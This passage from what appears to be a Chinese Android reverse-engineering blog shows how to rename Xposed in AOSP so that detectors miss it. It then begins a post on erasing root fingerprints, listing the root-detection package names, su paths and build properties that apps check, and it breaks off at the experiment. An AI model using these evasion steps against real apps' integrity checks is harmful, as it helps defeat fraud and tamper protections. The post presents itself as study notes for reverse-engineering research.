class=\"line\">IMPLEMENT_META_INTERFACE(XposedService, <span class=\"string\">&quot;de.robv.android.xposed.IXposedService&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>修改之后：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">IMPLEMENT_META_INTERFACE(XposedService, <span class=\"string\">&quot;de.robv.android.xppsed.IXposedService&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（4）xposed-shared-h\"><a href=\"#（4）xposed-shared-h\" class=\"headerlink\" title=\"（4）xposed_shared.h\"></a>（4）xposed_shared.h</h4><p>修改之前：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">#define XPOSED_DIR <span class=\"string\">&quot;/data/user_de/0/de.robv.android.xposed.installer/&quot;</span></span><br><span class=\"line\">#define XPOSED_DIR <span class=\"string\">&quot;/data/data/de.robv.android.xposed.installer/&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>修改之后：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">#define XPOSED_DIR <span class=\"string\">&quot;/data/user_de/0/de.robv.android.xppsed.installer/&quot;</span></span><br><span class=\"line\">#define XPOSED_DIR <span class=\"string\">&quot;/data/data/de.robv.android.xppsed.installer/&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/39.png\" alt=\"image-20211003152549464\"></p>\n<h4 id=\"（5）ART-mk\"><a href=\"#（5）ART-mk\" class=\"headerlink\" title=\"（5）ART.mk\"></a>（5）ART.mk</h4><p>修改之前：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">libxposed_art.cpp</span><br><span class=\"line\">LOCAL_MODULE := libxposed_art</span><br></pre></td></tr></table></figure>\n\n<p>修改之后：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">libxppsed_art.cpp</span><br><span class=\"line\">LOCAL_MODULE := libxppsed_art</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/40.png\" alt=\"image-20211003152549464\"></p>\n<h4 id=\"（6）libxposed-art-cpp\"><a href=\"#（6）libxposed-art-cpp\" class=\"headerlink\" title=\"（6）libxposed_art.cpp\"></a>（6）libxposed_art.cpp</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">将文件夹下的libxposed_art.cpp文件，重命名为libxppsed_art.cpp</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/41.png\" alt=\"image-20211003152549464\"></p>\n<h3 id=\"4-XposedTools\"><a href=\"#4-XposedTools\" class=\"headerlink\" title=\"4. XposedTools\"></a>4. XposedTools</h3><p>我们在XposedTools中将<code>build.pl</code>和<code>zipstatic/_all/META-INF/com/google/android/flash-script.sh</code>的字符替换就可以了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">xposed.prop---&gt;xppsed.prop</span><br><span class=\"line\">XposedBridge.jar---&gt;XppsedBridge.jar</span><br><span class=\"line\">libxposed_art---&gt;libxppsed_art</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/42.png\" alt=\"image-20211003152549464\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/43.png\" alt=\"image-20211003152549464\"></p>\n<p>记得不要有遗漏，可以在修改完之后，到根目录下运行下述grep命令试试看，找不到相应的字符串即为全部替换完成</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">grep -ril xposed.prop</span><br><span class=\"line\">grep -ril &quot;xposed.prop&quot; . ##过滤当前目录下含该字符串的文件</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/44.png\" alt=\"image-20211003152549464\"></p>\n<p>可是明明这里我是替换了的，我进入文件中也查找不到</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/45.png\" alt=\"image-20211003152549464\"></p>\n<p>经过分析，我们发现这里会将xposed_prop识别为xposed.prop，说明我们是替换完成了</p>\n<h3 id=\"5-源码编译\"><a href=\"#5-源码编译\" class=\"headerlink\" title=\"5.源码编译\"></a>5.源码编译</h3><p>源码编译流程，详细的参考上文</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）这里我们已经替换了art</span><br><span class=\"line\">（2）记得将修改的xposed替换/SourceCode/Android-6.0.1_r1/frameworks/base/cmds/`文件夹下的xposed文件夹</span><br><span class=\"line\">（3）还记得把编译出来的XppsedBridge.jar放到$AOSP/out/java/目录中去噢，替换旧的XposedBridge.jar</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/46.png\" alt=\"image-20211003152549464\"></p>\n<p>我们再次输入编译指令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./build.pl -t arm:23</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/47.png\" alt=\"image-20211003152549464\"></p>\n<p>编译成功，生成文件：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/48.png\" alt=\"image-20211003152549464\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/49.png\" alt=\"image-20211003152549464\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/50.png\" alt=\"image-20211003152549464\"></p>\n<p>我们重新移动生成文件到源码文件夹下，具体参考上文：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">cp /home/tom/SourceCode/XposedBridge/sdk23/arm/files/system/bin<span class=\"comment\">/* .</span></span><br><span class=\"line\"><span class=\"comment\">cp /home/tom/SourceCode/XposedBridge/sdk23/arm/files/system/lib/* .</span></span><br><span class=\"line\"><span class=\"comment\">cp /home/tom/SourceCode/XposedBridge/sdk23/arm/files/system/xppsed.prop  .</span></span><br></pre></td></tr></table></figure>\n\n<p>记得将xposed编译生成的app_process32_xposed替换system&#x2F;bin文件夹下的app_process32</p>\n<p>然后我们进入源码目录下，再次编译镜像：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">source build/envsetup.sh</span><br><span class=\"line\">lunch 19</span><br><span class=\"line\">make snod  //make snod命令的作用是重新生成镜像文件system.img</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/51.png\" alt=\"image-20211003165926906\"></p>\n<h3 id=\"6-结果与验证\"><a href=\"#6-结果与验证\" class=\"headerlink\" title=\"6.结果与验证\"></a>6.结果与验证</h3><h4 id=\"（1）结果\"><a href=\"#（1）结果\" class=\"headerlink\" title=\"（1）结果\"></a>（1）结果</h4><p>我们将镜像刷入手机：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">fastboot flash system system.img</span><br></pre></td></tr></table></figure>\n\n<p>然后重启，发现Xposed安装成功</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/52.png\" alt=\"image-20211003165926906\"></p>\n<h4 id=\"（2）验证\"><a href=\"#（2）验证\" class=\"headerlink\" title=\"（2）验证\"></a>（2）验证</h4><p>我们下载<a href=\"https://github.com/w568w/XposedChecker\">XposedCheck</a>，这里我们从官网下载源码，用Android Studio打开，然后编译安装，发现我们定制Xposed框架成功</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/53.png\" alt=\"image-20211003165926906\"></p>\n<h3 id=\"7-错误\"><a href=\"#7-错误\" class=\"headerlink\" title=\"7.错误\"></a>7.错误</h3><h4 id=\"（1）错误1\"><a href=\"#（1）错误1\" class=\"headerlink\" title=\"（1）错误1\"></a>（1）错误1</h4><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/54.png\" alt=\"image-20211003165926906\"></p>\n<p>问题分析：</p>\n<p>这是我们没有替换xposed导致的</p>\n<p>问题解决：</p>\n<p>我们将修改的Xposed替换原来<code>/SourceCode/Android-6.0.1_r1/frameworks/base/cmds/</code>文件夹下的xposed文件夹</p>\n<h4 id=\"（2）错误2\"><a href=\"#（2）错误2\" class=\"headerlink\" title=\"（2）错误2\"></a>（2）错误2</h4><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/55.png\" alt=\"image-20211003165926906\"></p>\n<p>问题分析：</p>\n<p>这是我们的Xposed文件夹首字母为大写导致</p>\n<p>问题解决：</p>\n<p>我们将其首字母改为小写</p>\n<h4 id=\"（3）错误3\"><a href=\"#（3）错误3\" class=\"headerlink\" title=\"（3）错误3\"></a>（3）错误3</h4><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/56.png\" alt=\"image-20211003165926906\"></p>\n<p>错误分析：</p>\n<p>这是xposedinstaller和XposedBridge版本不一致导致</p>\n<p>问题解决：</p>\n<p>匹配详细参考上文</p>\n<h4 id=\"（4）错误4\"><a href=\"#（4）错误4\" class=\"headerlink\" title=\"（4）错误4\"></a>（4）错误4</h4><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/57.png\" alt=\"image-20211003165926906\"></p>\n<p>错误分析：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/58.png\" alt=\"image-20211003165926906\"></p>\n<p>错误分析：</p>\n<p>经过反复的检查，最后原来是XposedBridge.jar编译的问题</p>\n<p>问题解决：</p>\n<p>因为我们编译过程中，将这里给注释掉了 所以导致并没导入Android6.0的环境支持，我们需要加入支持，详细见上文</p>\n<h2 id=\"六、实验总结\"><a href=\"#六、实验总结\" class=\"headerlink\" title=\"六、实验总结\"></a>六、实验总结</h2><p>经过几天的学习，处理完许许多多的bug，从源码分析到源码定制，花了一周终于将这几篇文章写完了，从中收获了很多，这中间参考了很多大佬的文章，在文中和参考文献中会一一列出来，如果其中还存在一些问题，就请各位大佬指正了。</p>\n<h2 id=\"七、参考文献\"><a href=\"#七、参考文献\" class=\"headerlink\" title=\"七、参考文献\"></a>七、参考文献</h2><p>Android源码分析：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://juejin.cn/post/6844903748058218509、</span><br><span class=\"line\">https://www.jianshu.com/p/2c0b76d0f4f2</span><br><span class=\"line\">https://www.jianshu.com/p/8bb770ec4c48</span><br><span class=\"line\">https://www.javatt.com/p/42078</span><br><span class=\"line\">https://blog.csdn.net/luoshengyang/article/details/8852432</span><br><span class=\"line\">https://blog.csdn.net/luoshengyang/article/details/8885792</span><br><span class=\"line\">https://www.jianshu.com/p/89d06f626540</span><br><span class=\"line\">https://www.wuyifei.cc/dex-vdex-odex-art/</span><br><span class=\"line\">https://skytoby.github.io/2019/Android%20dex%EF%BC%8Codex%EF%BC%8Coat%EF%BC%8Cvdex%EF%BC%8Cart%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</span><br><span class=\"line\">https://cloud.tencent.com/developer/article/1755790</span><br><span class=\"line\">https://www.kancloud.cn/alex_wsc/androids/473620</span><br></pre></td></tr></table></figure>\n\n<p>Xposed：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://zhuanlan.zhihu.com/p/389889716</span><br><span class=\"line\">https://www.bbsmax.com/A/MAzAq2Ynz9/</span><br><span class=\"line\">https://www.cnblogs.com/baiqiantao/p/10699552.html</span><br><span class=\"line\">https://www.jianshu.com/p/6b4a80654d4e</span><br><span class=\"line\">http://www.uml.org.cn/mobiledev/201903052.asp</span><br><span class=\"line\">https://bbs.pediy.com/thread-255836.htm</span><br><span class=\"line\">https://mp.weixin.qq.com/s/YAMCrQSi0LFJGNIwB9qHDA</span><br></pre></td></tr></table></figure>\n\n","categories":["Android源码定制"],"tags":["逆向技术","Xposed"]},{"title":"Android源码定制（5）——root指纹定制与抹除","url":"/2022/12/05/code5/","content":"<h2 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1.前言\"></a>1.前言</h2><p>本文为源码定制学习的root指纹抹除篇，通过本文的学习，读者可以掌握Android指纹的基本定制能力和root定制能力，本文参考了看雪大佬<a href=\"https://bbs.pediy.com/thread-273485.htm\">应用root检测通杀篇</a>，为实验记录笔记。有问题，可以一一指出：</p>\n<span id=\"more\"></span>\n\n<p>本文第二节主要讲述基本原理</p>\n<p>本文第三节主要讲述实验</p>\n<p>本文第四节主要为总结</p>\n<h2 id=\"2-基础知识\"><a href=\"#2-基础知识\" class=\"headerlink\" title=\"2.基础知识\"></a>2.基础知识</h2><h3 id=\"2-1-指纹解析\"><a href=\"#2-1-指纹解析\" class=\"headerlink\" title=\"2.1 指纹解析\"></a>2.1 指纹解析</h3><p>需要对Android指纹进行修改，最重要是明白<code>build.prop</code>的参数含义，这里截取网上文章中的一部分，方便大家理解：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># begin build properties （开始设置系统性能）</span><br><span class=\"line\"># autogenerated （通过设置形成系统信息）</span><br><span class=\"line\">ro.=GRI40 (版本ID)</span><br><span class=\"line\">ro.build.=GRJ22 （版本号）</span><br><span class=\"line\">ro.build.version.incremental=eng.buildbot<span class=\"number\">.20110619</span><span class=\"number\">.060228</span> （版本增量）</span><br><span class=\"line\">ro.build.version.sdk=<span class=\"number\">10</span> （sdk版本）</span><br><span class=\"line\">ro.build.version.codename=REL （版本代号）</span><br><span class=\"line\">ro.build.version.release=<span class=\"number\">2.3</span><span class=\"number\">.4</span> （Android <span class=\"number\">2.3</span><span class=\"number\">.4</span>系统）</span><br><span class=\"line\">ro.build.date=Sun Jun <span class=\"number\">19</span> <span class=\"number\">06</span>:<span class=\"number\">02</span>:<span class=\"number\">58</span> UTC <span class=\"number\">2011</span> （制作者及制作时间）</span><br><span class=\"line\">ro.build.date.utc=<span class=\"number\">0</span></span><br><span class=\"line\">ro.build.type=user (编译模式,如user,userdebug,eng,test模式)</span><br><span class=\"line\">ro.build.user=buildbot (编译账户)</span><br><span class=\"line\">ro.build.host=bb1 (编译主机系统)</span><br><span class=\"line\">ro.build.tags=test-keys (编译标签)</span><br><span class=\"line\">ro.product.model=HTC Wildfire （HTC内部手机代号）</span><br><span class=\"line\">ro.product.brand=htc_wwe （手机品牌）</span><br><span class=\"line\">ro.product.name=htc_buzz （手机正式名称）</span><br><span class=\"line\">ro.product.device=buzz （采用的设备）</span><br><span class=\"line\">ro.product.board=buzz （采用的处理器）</span><br><span class=\"line\">ro.product.cpu.abi=armeabi-v6j （cpu的版本）</span><br><span class=\"line\">ro.product.cpu.abi2=armeabi （cpu的品牌）</span><br><span class=\"line\">ro.product.manufacturer=HTC （手机制造商）</span><br><span class=\"line\">ro.product.locale.language=zh （手机默认语言）</span><br><span class=\"line\">ro.product.locale.region=CN （地区语言）</span><br><span class=\"line\">ro.wifi.channels= （WIFI连接的渠道）</span><br><span class=\"line\">ro.board.platform=msm7k （主板平台）</span><br><span class=\"line\"># ro.build.product is obsolete; use ro.product.device （旧代码ro.build.product，使用代码ro.product.device）</span><br><span class=\"line\">ro.build.product=buzz （建立产品）</span><br><span class=\"line\"># Do not <span class=\"keyword\">try</span> to parse ro.build.description or .fingerprint （不要试图修改description和fingerprint）</span><br><span class=\"line\">ro.build.description=passion-user <span class=\"number\">2.3</span><span class=\"number\">.3</span> GRI40 <span class=\"number\">102588</span> release-keys （用户的KEY）</span><br><span class=\"line\">ro.build.fingerprint=google/passion/passion:<span class=\"number\">2.3</span><span class=\"number\">.3</span>/GRI40/<span class=\"number\">102588</span>:user/release-keys （系统指纹）</span><br><span class=\"line\"># end build properties （性能代码完毕）</span><br><span class=\"line\">#</span><br><span class=\"line\"># system.prop <span class=\"keyword\">for</span> buzz （系统技术支持由BUZZ提供）</span><br><span class=\"line\">#</span><br><span class=\"line\"># Density in DPI of the LCD of <span class=\"built_in\">this</span> board. This is used to scale the UI （高密度的液晶的DPI板。这是用来大规模UI的）</span><br><span class=\"line\"># appropriately. If <span class=\"built_in\">this</span> property is not defined, the <span class=\"keyword\">default</span> value is <span class=\"number\">160</span> dpi. （appropriately.如果这个属性没有定义,缺省值是<span class=\"number\">160</span> dpi的分辨率）</span><br><span class=\"line\">ro.sf.lcd_density=<span class=\"number\">240</span> （显示屏分辨率，数值越大分辨率越底，<span class=\"number\">240</span>就是<span class=\"number\">800</span>*<span class=\"number\">480</span>的）</span><br><span class=\"line\"># View configuration <span class=\"keyword\">for</span> QVGA. （屏幕的设置）</span><br><span class=\"line\">view.fading_edge_length=<span class=\"number\">8</span></span><br><span class=\"line\">view.touch_slop=<span class=\"number\">15</span> （触摸屏灵敏度，数值越大越灵敏）</span><br><span class=\"line\">view.minimum_fling_velocity=<span class=\"number\">25</span> （滑动速度）</span><br><span class=\"line\">view.scroll_friction=<span class=\"number\">0.008</span> （滑动误差）</span><br><span class=\"line\"># RIL specific configuration. （特定设置）</span><br><span class=\"line\">rild.libpath=/system/lib/libhtc_</span><br><span class=\"line\">ro.ril.ecc.HTC-WWE=<span class=\"number\">999</span></span><br><span class=\"line\">ro.ril.ecc.HTC-ELL=<span class=\"number\">92</span>,<span class=\"number\">93</span>,<span class=\"number\">94</span></span><br><span class=\"line\">ro.ril.enable.a52.HTC-ITA=<span class=\"number\">1</span></span><br><span class=\"line\">ro.ril.enable.a53.HTC-ITA=<span class=\"number\">1</span></span><br><span class=\"line\">ro.ril.enable.a52=<span class=\"number\">0</span></span><br><span class=\"line\">ro.ril.enable.a53=<span class=\"number\">1</span></span><br><span class=\"line\">ro.ril.vmail<span class=\"number\">.23415</span>=<span class=\"number\">1571</span>,BT</span><br><span class=\"line\">ro.ril.hsdpa.category=<span class=\"number\">8</span> （hsdpa全称High Speed Downlink Packet Access中文意思：高速下行分组接入,设置的数越大传输越快）</span><br><span class=\"line\">ro.ril.htcmaskw1.bitmask=<span class=\"number\">429496</span></span><br><span class=\"line\">ro.ril.htcmaskw1=<span class=\"number\">14449</span></span><br><span class=\"line\">ro.ril.def.agps.mode=<span class=\"number\">2</span> （打开AGPS服务支持，可改为ro.ril.def.agps.mode=<span class=\"number\">0</span> 改后能省电但GPS定位速度会变慢）</span><br><span class=\"line\">ro.ril.gprsclass=<span class=\"number\">12</span> （GPRS设置）</span><br><span class=\"line\"># For HSDPA low throughput （HSDPA低输量）</span><br><span class=\"line\">ro.ril.disable.power.collapse=<span class=\"number\">1</span> （关闭电源）</span><br><span class=\"line\"># Modify MMS APN retry timer from 5s to 2s. （修改短信的APN设置<span class=\"number\">5</span>秒为<span class=\"number\">2</span>秒）</span><br><span class=\"line\">ro.gsm.2nd_data_retry_config=max_retries=<span class=\"number\">3</span>, <span class=\"number\">2000</span>, <span class=\"number\">2000</span>, <span class=\"number\">2000</span></span><br><span class=\"line\"># Time between scans in seconds. Keep it high to minimize battery drain.（扫描在几秒之内，可降低用电量）</span><br><span class=\"line\"># This only affects the <span class=\"keyword\">case</span> in which there are remembered access points, （这个修改仅能影响此文件）</span><br><span class=\"line\"># but none are in range.（但是没有一项是在范围内的）</span><br><span class=\"line\">wifi.interface=eth0 （WIFI界面）</span><br><span class=\"line\">wifi.supplicant_scan_interval=<span class=\"number\">45</span> （WIFI扫描间隔时间，这里设置是<span class=\"number\">45</span>秒。把这个时间设置长点能省电）</span><br><span class=\"line\"># Mobile data interfaces （移动数据的接口）</span><br><span class=\"line\">mobiledata.interfaces=rmnet0,rmnet1,rmnet2</span><br><span class=\"line\"># Allow or deny tethering. （允许和拒绝绑定）</span><br><span class=\"line\">ro.tether.denied=<span class=\"literal\">false</span></span><br><span class=\"line\"># Default network type. （默认的网络类型）</span><br><span class=\"line\"># <span class=\"number\">0</span> =&gt; WCDMA Preferred. （<span class=\"number\">0</span>=WCDMA优先）</span><br><span class=\"line\">ro.telephony.default_network=<span class=\"number\">0</span></span><br><span class=\"line\"># Enable Google-specific location features, （谷歌特定地点的设置）</span><br><span class=\"line\"># like NetworkLocationProvider and LocationCollector.（如网络服务器提供商和服务器位置）</span><br><span class=\"line\">ro.c o m.google.locationfeatures=<span class=\"number\">1</span></span><br><span class=\"line\"># The OpenGL ES API level that is natively supported by <span class=\"built_in\">this</span> device. （开放式绘图介面）</span><br><span class=\"line\"># This is a <span class=\"number\">16.16</span> fixed point number. （界面有<span class=\"number\">16</span>个点，<span class=\"number\">16</span>个不动点数量）</span><br><span class=\"line\">ro.opengles.version=<span class=\"number\">65536</span> （开放式绘图介面参数）</span><br><span class=\"line\"># Disable fs check on boot by <span class=\"keyword\">default</span>. （开机时默认禁用FS检查）</span><br><span class=\"line\">sys.checkfs.fat=<span class=\"literal\">false</span></span><br><span class=\"line\"># Performance settings. （性能设置）</span><br><span class=\"line\">dalvik.vm.execution-mode=<span class=\"type\">int</span>:jit</span><br><span class=\"line\">dalvik.vm.heapsize=24m （虚拟内存大小，可设置为16m或24m或32m或48m）</span><br><span class=\"line\">persist.sys.use_dithering=<span class=\"number\">1</span></span><br><span class=\"line\">persist.sys.purgeable_assets=<span class=\"number\">1</span></span><br><span class=\"line\"># Increase SKIA decode memory capability <span class=\"keyword\">for</span> progressive jpg file.</span><br><span class=\"line\">ro.media.dec.jpeg.memcap=<span class=\"number\">20000000</span></span><br><span class=\"line\">#</span><br><span class=\"line\"># ADDITIONAL_BUILD_PROPERTIES （其他性能设置）</span><br><span class=\"line\">no_require_sim=<span class=\"literal\">true</span> （手机卡保护设置）</span><br><span class=\"line\">ro.rommanager.developerid=cyanogenmodnightly （固件管理器开发者是CM大神）</span><br><span class=\"line\">ro.url.legal=http:<span class=\"comment\">//www./intl/%s/mobile/android/basic/phone-legal.html</span></span><br><span class=\"line\">ro.url.legal.android_privacy=http:<span class=\"comment\">//www]/intl/%s/mobile/android/basic/privacy.html</span></span><br><span class=\"line\">ro. com.google.clientidbase=android-google （谷歌客户身份）</span><br><span class=\"line\">ro. com.android.wifi-watchlist=GoogleGuest （WIFI用户名单）</span><br><span class=\"line\">ro.setupwizard.enterprise_mode=<span class=\"number\">1</span> （默认情景模式）</span><br><span class=\"line\">ro. com.android.dateformat=MM-dd-yyyy （默认时间格式，改为yyyy-MM-dd，显示效果就是XXXX年XX月XX日）</span><br><span class=\"line\">ro. com.android.dataroaming=<span class=\"literal\">false</span> （漫游设置）</span><br><span class=\"line\">ro.config.ringtone=Playa.ogg （默认铃声设置，文件在/system/media/audio/ringtones 把喜欢的铃声放这里，比如<span class=\"number\">123.</span> MP3放入ringtones文件夹中，这里代码改为ro.config.ringtone=<span class=\"number\">123.</span> mp3）</span><br><span class=\"line\">ro.config.notification_sound=regulus.ogg （默认提示音，文件在/system/media/audio/notifications 修改方法同上）</span><br><span class=\"line\">ro.config.alarm_alert=Alarm_Beep_03.ogg （默认闹铃，文件在/system/media/audio/alarms 修改方法同上）</span><br><span class=\"line\">ro.modversion=CyanogenMod-<span class=\"number\">7</span>-06192011-NIGHTLY-buzz （版本信息，改这个能让你大名出现系统关于中，改为ro.modversion=xxxxx）</span><br><span class=\"line\">ro.setupwizard.mode=OPTIONAL （安装向导模式）</span><br><span class=\"line\">net. bt. name=Android （系统名称）</span><br><span class=\"line\">dalvik.vm.stack-trace-file=/data/anr/traces.txt </span><br></pre></td></tr></table></figure>\n\n<p>参考文章：<a href=\"https://www.jianshu.com/p/dd6cca4ec27d\">Android系统build.prop文件生成过程</a></p>\n<p>后面我们要修改设备的指纹，主要关注两个文件：<code>buildinfo.sh</code>和<code>Makefile</code></p>\n<h3 id=\"2-2-root检测方式\"><a href=\"#2-2-root检测方式\" class=\"headerlink\" title=\"2.2 root检测方式\"></a>2.2 root检测方式</h3><p>一般Android 上root检测的基本方式包含：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）检查su命令是否存在</span><br><span class=\"line\">（2）检查常用目录是否存在su（或检测是否存在s权限的文件）</span><br><span class=\"line\">（3）使用which命令查看是否存在su</span><br><span class=\"line\">（4）主动申请root权限</span><br><span class=\"line\">（5）执行busybox</span><br><span class=\"line\">（6）检查Android属性（读取build.prop中关键属性，如ro.build.tags和ro.build.type）</span><br><span class=\"line\">（7）检查特定路径是否有写权限（在Android系统中，有些目录是普通用户不能访问的，例如/data、/system、/etc等）</span><br><span class=\"line\">（8）检查市面主流的模拟器</span><br><span class=\"line\">（9）检测frida、xposed等Hook框架的特征</span><br></pre></td></tr></table></figure>\n\n<p>具体可以分为：Android root的系统指纹、root的路径指纹、root的执行操作、第三方工具等</p>\n<p>参考文章：<a href=\"http://lzonel.cn/3136.html\">修改ROM实现自定义su命令-root检测通杀</a>，这里给出了一些基本的root检测指纹：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.detectRootManagementApps—检测常见su包名,如&#123;“com.noshufou.android.su”, “com.noshufou.android.su.elite”, “eu.chainfire.supersu”, “com.koushikdutta.superuser”, “com.thirdparty.superuser”, “com.yellowes.su”, “com.topjohnwu.magisk”, “com.kingroot.kinguser”, “com.kingo.root”, “com.smedialink.oneclickroot”, “com.zhiqupk.root.global”, “com.alephzain.framaroot”&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">2.detectPotentiallyDangerousApps—&#123;“com.koushikdutta.rommanager”, “com.koushikdutta.rommanager.license”, “com.dimonvideo.luckypatcher”, “com.chelpus.lackypatch”, “com.ramdroid.appquarantine”, “com.ramdroid.appquarantinepro”, “com.android.vending.billing.InAppBillingService.COIN”, “com.android.vending.billing.InAppBillingService.LUCK”, “com.chelpus.luckypatcher”, “com.blackmartalpha”, “org.blackmart.market”, “com.allinone.free”, “com.repodroid.app”, “org.creeplays.hack”, “com.baseappfull.fwd”, “com.zmapp”, “com.dv.marketmod.installer”, “org.mobilism.android”, “com.android.wp.net.log”, “com.android.camera.update”, “cc.madkite.freedom”, “com.solohsu.android.edxp.manager”, “org.meowcat.edxposed.manager”, “com.xmodgame”, “com.cih.game_cih”, “com.charles.lpoqasert”, “catch_.me_.if_.you_.can_”&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">3.detectRootCloakingApps—&#123;“com.devadvance.rootcloak”, “com.devadvance.rootcloakplus”, “de.robv.android.xposed.installer”, “com.saurik.substrate”, “com.zachspong.temprootremovejb”, “com.amphoras.hidemyroot”, “com.amphoras.hidemyrootadfree”, “com.formyhm.hiderootPremium”, “com.formyhm.hideroot”&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">4.suPath—遍历执行可能存在的su文件夹,如&#123;“/data/local/”, “/data/local/bin/”, “/data/local/xbin/”, “/sbin/”, “/su/bin/”, “/system/bin/”, “/system/bin/.ext/”, “/system/bin/failsafe/”, “/system/sd/xbin/”, “/system/usr/we-need-root/”, “/system/xbin/”, “/cache/”, “/data/”, “/dev/”&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">5.checkForDangerousProps—检查一些属性的值.&#123;ro.debuggable”, “1”&#125;,&#123;“ro.secure”, “0”&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">6.checkForRWPaths—先执行(需要root)mount如果返回true然后再查看是否有读写权限&#123;“/system”, “/system/bin”, “/system/sbin”, “/system/xbin”, “/vendor/bin”, “/sbin”, “/etc”&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">7.detectTestKeys—查看编译类型是否为 &#123;“test-keys”&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">8.checkBuildProp—检查Buildprop的值,&#123;“ro.build.display.id”,”ro.build.version.incremental”,”ro.build.date”,”ro.build.date.utc”,”ro.build.type”,”ro.build.user”,”ro.build.flavor”,”ro.build.tags”,”ro.build.description”,”ro.build.fingerprint”,”ro.product.model”,”ro.product.brand”,”ro.product.name”&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">9.checkSuExists—执行su,看看能否执行成功</span><br><span class=\"line\"></span><br><span class=\"line\">10.checkForRootNative—Native层root检查</span><br><span class=\"line\"></span><br><span class=\"line\">11.checkForMagiskBinary—检测是否存在Magisk-&#123;“/data/local/”, “/data/local/bin/”, “/data/local/xbin/”, “/sbin/”, “/su/bin/”, “/system/bin/”, “/system/bin/.ext/”, “/system/bin/failsafe/”, “/system/sd/xbin/”, “/system/usr/we-need-root/”, “/system/xbin/”, “/cache/”, “/data/”, “/dev/”&#125;</span><br></pre></td></tr></table></figure>\n\n<p>具体的大家可以参考原文</p>\n<p>我在前面的文章：<a href=\"https://bbs.pediy.com/thread-272452.htm\">Android漏洞之战调试与反调试</a>也用真实的代码进行了展演示，这里大家可以进行参考</p>\n<h2 id=\"3-实验\"><a href=\"#3-实验\" class=\"headerlink\" title=\"3.实验\"></a>3.实验</h2><p>实验环境：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pixel Android8.0.1</span><br><span class=\"line\">Ubuntu 18</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-1-user版本的编译\"><a href=\"#3-1-user版本的编译\" class=\"headerlink\" title=\"3.1 user版本的编译\"></a>3.1 user版本的编译</h3><p>首先，我们编译user版本的镜像，里我需要编译的目标版本是<code>aosp_sailfish-user</code>，那么在编译的选项中是没有这一项的，根据<code>lunch</code>命令列出的文件，随意找一个文件进行修改，我们以<code>device/google/marlin/vendorsetup.sh</code>文件为例，进行修改</p>\n<figure class=\"highlight 